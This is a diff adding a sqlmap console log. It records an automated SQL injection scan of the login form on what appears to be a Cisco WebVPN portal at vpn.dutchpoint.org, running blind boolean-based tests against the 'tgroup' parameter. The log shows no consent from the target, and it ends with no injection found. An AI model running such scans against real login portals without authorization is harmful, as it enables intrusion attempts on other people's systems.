@@ -1,0 +1,37 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.4#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:18:14 /2026-03-06/
+
+[17:18:14] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[17:18:14] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('webvpnlogin=1;webvpnLang=en'). Do you want to use those [Y/n] Y
+[17:18:16] [INFO] searching for forms
+[1/1] Form:
+POST https://vpn.dutchpoint.org/ webvpn /index.html
+POST data: tgroup=&next=&tgcookieset=&csrf_token=2188a1533d5e6ed01405e390e9f34e6ced55d128&username=&password=&Login=Logon
+do you want to test this form? [Y/n/q] 
+> Y
+Edit POST data [default: tgroup=&next=&tgcookieset=&csrf_token=2188a1533d5e6ed01405e390e9f34e6ced55d128&username=&password=&Login=Logon] (Warning: blank fields detected): tgroup=&next=&tgcookieset=&csrf_token=2188a1533d5e6ed01405e390e9f34e6ced55d128&username=&password=&Login=Logon
+do you want to fill blank fields with random values? [Y/n] Y
+POST parameter 'csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[17:18:16] [INFO] using '/home/cjs/.local/share/sqlmap/output/results-03062026_0518pm.csv' as the CSV results file in multiple targets mode
+got a 307 redirect to 'https://vpn.dutchpoint.org/+CSCOE+/message.html?mc=2'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[17:18:18] [INFO] testing if the target URL content is stable
+[17:18:20] [WARNING] POST parameter 'tgroup' does not appear to be dynamic
+[17:18:22] [WARNING] heuristic (basic) test shows that POST parameter 'tgroup' might not be injectable
+[17:18:23] [INFO] testing for SQL injection on POST parameter 'tgroup'
+[17:18:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:18:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[17:18:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[17:19:12] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[17:19:30] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[17:19:50] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[17:20:09] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
